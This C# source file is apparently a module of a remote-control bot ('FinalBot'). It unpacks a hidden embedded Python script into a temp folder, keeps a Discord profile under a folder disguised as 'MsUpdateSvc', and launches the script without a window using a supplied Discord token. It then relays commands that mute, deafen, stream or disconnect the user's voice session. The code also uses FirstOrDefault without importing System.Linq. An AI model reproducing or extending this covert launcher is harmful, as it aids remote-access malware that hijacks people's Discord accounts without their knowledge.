using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace FinalBot.Modules
{
    public static class DiscordRemoteManager
    {
        private static readonly string _tempDir = Path.Combine(Path.GetTempPath(), "FinalTempSys");
        private static readonly string _profileDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "MsUpdateSvc", "DiscordProfile");

        public static string LaunchDiscordBot(string token, string url, string action = "join")
        {
            try
            {
                // Control logic
                if (action == "mute_mic" || action == "deafen" || action == "deaf" || action == "stream" || action == "disconnect")
                {
                    string cmdFile = Path.Combine(Path.GetTempPath(), "discord_cmd.txt");
                    File.WriteAllText(cmdFile, action == "deaf" ? "deafen" : action);
                    return $"⚡ Command `{action}` signaled.";
                }

                if (!Directory.Exists(_tempDir)) Directory.CreateDirectory(_tempDir);
                string outPath = Path.Combine(_tempDir, "discord_bot.py");

                // Extract resource
                if (!File.Exists(outPath) || new FileInfo(outPath).Length < 100)
                {
                    var assembly = Assembly.GetExecutingAssembly();
                    string resourceName = assembly.GetManifestResourceNames()
                        .FirstOrDefault(n => n.EndsWith("discord_bot.py"));
                    
                    if (string.IsNullOrEmpty(resourceName))
                        return "❌ Failed: Resource 'discord_bot.py' not found in assembly.";

                    using (Stream stream = assembly.GetManifestResourceStream(resourceName))
                    {
                        if (stream == null) return "❌ Failed: Stream is null for " + resourceName;
                        using (FileStream fileStream = new FileStream(outPath, FileMode.Create, FileAccess.Write))
                        {
                            stream.CopyTo(fileStream);
                        }
                    }
                }

                // Ensure profile dir exists
                if (!Directory.Exists(_profileDir)) Directory.CreateDirectory(_profileDir);

                // Launch via Python
                Process.Start(new ProcessStartInfo
                {
                    FileName = "python",
                    Arguments = $"\"{outPath}\" \"{token}\" \"{url}\" \"{action}\" --profile \"{_profileDir}\"",
                    UseShellExecute = true,
                    CreateNoWindow = true
                });

                return $"✅ Discord Remote launched: Action `{action}` started.";
            }
            catch (Exception ex)
            {
                return $"❌ Error launching Discord bot: {ex.Message}";
            }
        }
    }
}
